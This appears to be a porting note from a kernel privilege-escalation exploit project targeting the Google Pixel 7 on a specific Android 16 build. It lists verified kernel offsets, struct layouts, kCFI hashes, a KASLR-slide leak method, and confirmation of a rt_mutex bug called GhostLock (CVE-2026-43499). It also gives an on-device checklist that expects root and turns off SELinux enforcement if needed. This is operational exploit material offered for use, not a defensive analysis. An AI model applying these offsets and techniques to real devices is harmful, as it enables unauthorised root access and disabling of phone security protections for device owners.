# panther-BP3A.250905.014 — Google Pixel 7

First non-Samsung target. The Pixel 7 keeps GKI 6.1 on Android 16 (SDK 36),
which changes two things the exploit must handle:

1. **Physical KASLR does not exist on Pixel.** The bootloader decompresses
   the kernel Image at the same 2MB-aligned physical address every boot
   (image base `0x80000000`, `_stext` at `0x80010000`). The linear-map
   (direct-map) alias of any image offset is therefore STATIC:
   `alias(O) = 0xffffff8000000000 + O` — `P0_ALIAS_INCLUDES_SLIDE` is 0.
   The fops overwrite target (`ashmem_misc.fops`) never needs the slide.

2. **The VA KASLR slide is huge and 2MB-granular** (up to ~190GB observed
   on GKI 6.1; VA_BITS=39), so the q7mq fingerprint-table conversion
   (`X = 0x1f0000 - va_slide`) does not apply. The slide is recovered by
   reading the runtime global `kimage_voffset` through the p0 pipe oracle
   at its static linear alias:

   ```
   kimage_voffset = slid_kernel_base - __pa(KERNEL_START)
   slide = kimage_voffset - (KIMAGE_TEXT_BASE - P0_KERNEL_PHYS_LOAD)
   ```

   (`kimage_voffset` is written in `__primary_switched`, head.S:433-435.)
   The probe slot and the pipe readback are unchanged — only the probe
   page (P0_ORACLE_PROBE_OFFSET = page of `kimage_voffset`) and the scan
   interpretation (`scan_p0_global_slide`, gated by `P0_SLIDE_VIA_GLOBAL`)
   differ from the q7mq fingerprint path.

## Firmware identity

```text
model:          Pixel 7 (panther)
baseband:       g5300q-250605-250630-B-13713258
display build:  BP3A.250905.014
fingerprint:    google/panther/panther:16/BP3A.250905.014/13873947:user/release-keys
sdk:            36 (Android 16)
kernel release: 6.1.134-android14-11-g66e758f7d0c0-ab13748739
kernel /proc/version:
  Linux version 6.1.134-android14-11-g66e758f7d0c0-ab13748739
  (kleaf@build-host) (Android (11368308, +pgo, +bolt, +lto, +mlgo, based on r510928)
  clang version 18.0.0 (477610d4d0d988e69dbc3fae4fe86bff3f07f2b5), LLD 18.0.0)
  #1 SMP PREEMPT Tue Jul  8 09:17:32 UTC 2025
```

## Provenance

```text
OTA zip:           panther-ota-bp3a.250905.014-6818bc97.zip
boot.img size:     67108864
kernel blob:       LZ4 frame @ 0x1000, 16539882 bytes
Image size:        35432960 (0x21ca000)
Image SHA-256:     5AE500F91BD1FB19A16E9F4C8B93FA8A94A877486F4F030B8531054FBDAB3059
ARM64 Image:       text_offset=0x0  image_size=0x2270000  flags=0xa  (EFI stub PE header)
recovered ELF base:0xffffffc008000000  (== KIMAGE_TEXT_BASE, unslid _text)
kallsyms:          vmlinux-to-elf from the shipped Image (CONFIG_KALLSYMS_ALL)
struct layouts:    BTF extracted from the shipped Image (pahole)
```

## Key offsets (all verified against kallsyms/BTF)

```text
KIMAGE_TEXT_BASE   0xffffffc008000000     _text (unslid)
P0_PAGE_OFFSET     0xffffff8000000000     VA_BITS=39
P0_PHYS_OFFSET     0x80000000             memstart_addr (static)
P0_KERNEL_PHYS_LOAD 0x80000000            image base (static, no phys KASLR)
VMEMMAP_START      0xfffffffe00000000     -(1 << (39 - 6))
ashmem_misc        +0x214bdf0             (not in kallsyms; found via
                                          ashmem_init → misc_register xref)
ashmem_open        +0xc2d890              kCFI hash 0x8f07ca55 (== pa3q/q7mq)
configfs_read_iter +0x461744              kCFI hash 0xc6175f03 (== pa3q/q7mq)
kimage_voffset     +0x15b5a48             slide-leak global (P0_SLIDE_GLOBAL_OFF)
init_task          +0x1fef600
mm_struct          960 bytes              MM_STRUCT_SZ 0x3c0 (kmalloc-1k)
rt_mutex_waiter    88 bytes, LEGACY layout: pi_tree @0x18, task @0x30,
                    lock @0x38, wake_state @0x40, prio @0x44, deadline
                    @0x48, ww_ctx @0x50
task_struct        pi_lock @0x924, pi_waiters @0x938, pi_top_task @0x948,
                    pi_blocked_on @0x950  (CVE bug site: remove_waiter does
                    `str xzr, [x20, #0x950]` with x20 = current)
file_operations    6.1 layout: ioctl @0x50, compat_ioctl @0x58, mmap @0x60,
                    open @0x70, release @0x80, splice_read @0xc8,
                    show_fdinfo @0xe0
```

## GhostLock (CVE-2026-43499) confirmation

`remove_waiter` on this kernel contains the same bug as q7mq:

```asm
mrs x20, SP_EL0          ; x20 = current (the REQUEUER)
str xzr, [x20, #0x950]   ; current->pi_blocked_on = NULL  ← the bug
```

## GKI config notes (extracted from the shipped Image)

```text
CONFIG_ASHMEM=y               fops overwrite target is built-in
CONFIG_NETFILTER_NETLINK_LOG=y  nfulnl_logger exists, but the Samsung
                                boot_id pointer leak / random_table do not
CONFIG_CFI_CLANG=y            kCFI hashes verified at fn-4 for every
                                fake-fops entry
CONFIG_RANDOMIZE_BASE=y       VA KASLR, 2MB granular, huge range
CONFIG_ARM64_VA_BITS=39       PAGE_OFFSET 0xffffff8000000000
CONFIG_KASAN_HW_TAGS=y        MTE-based KASAN (watch for physrw tag checks)
CONFIG_EFI_STUB=y             PE/MZ header at Image start
```

## Status

- Build-verified (104128-byte release artifact, SHA256
  `c201269403842f2a6fdae453598ba0ec96292267a8818165cf356adae2593583`).
- **Not yet device-tested.** On-device checklist when a panther on this
  build is available:
  1. `p0 kimage_voffset=... -> va_slide=...` must print a 2MB-aligned slide
  2. `cfi write ret=35` / `cfi read ret=35` (configfs trampoline)
  3. `done=1 root=1`, `uid=10567->0` — note the app uid will differ
  4. UMH exec under Pixel SELinux (kernel-domain exec of the helper) is
     the main unknown; if denied, the physrw stage can clear
     `selinux_state.enforcing` (SELINUX_ENFORCING_OFF, no KDP on GKI)
     before queueing the UMH.
